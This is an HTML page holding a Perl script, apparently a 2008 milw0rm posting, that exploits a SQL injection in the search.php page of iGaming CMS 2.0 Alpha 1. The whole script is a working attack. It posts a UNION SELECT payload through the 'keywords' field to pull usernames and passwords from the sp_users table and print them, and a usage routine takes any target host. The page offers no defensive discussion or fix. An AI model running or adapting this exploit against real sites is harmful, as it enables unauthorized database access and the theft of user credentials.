<html><head><title>iGaming CMS 2.0 Alpha 1 (search.php) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl 
# -----------------------------------------------------
# iGaming CMS 2.0 Alpha 1 Remote SQL Injection Exploit
# By StAkeR aka athos - StAkeR[at]hotmail[dot]it
# On 16/10/2008
# http://www.igamingcms.com/iGaming_2_Alpha.zip
# -----------------------------------------------------

use strict;
use LWP::UserAgent;


my ($host,$id) = @ARGV;

usage() unless $host =~ /http:\/\/(.+?)$/ and $id =~ /^[0-9]/;

my $etc = &quot;' union select 1,concat(0x616E6172636879,&quot;.
          &quot;password,0x3a,username,0x616E6172636879),3&quot;.
          &quot;,4,5 from sp_users where id=$id#&quot;;
          
my @search = ($etc,'all',0,'Search','search_games');          
my @split = undef;          
          
my $http = new LWP::UserAgent;
my $post = $http-&gt;post($host.'/search.php',
                      [
                       keywords =&gt; $search[0],
                       platform =&gt; $search[1],
                       exact    =&gt; $search[2],
                       submit   =&gt; $search[3],
                       do       =&gt; $search[4]
                     ]);
                     
if($post-&gt;is_success)
{
  if($post-&gt;as_string =~ /anarchy(.+?)anarchy/)
  {
    @split = split(':',$1);
    
    print &quot;Username: $split[0]\r\n&quot;;
    print &quot;Password: $split[1]\r\n&quot;;
  }
  else
  {
    print &quot;Exploit Failed!\r\n&quot;;
  }
}

sub usage
{
  print &quot;iGaming CMS 2.0 Alpha 1 Remote SQL Injection Exploit\r\n&quot;;
  print &quot;Usage: perl $0 http://[host] [user_id]\r\n&quot;;
  exit;
}


            
__END__         

# milw0rm.com [2008-10-16]</pre></html>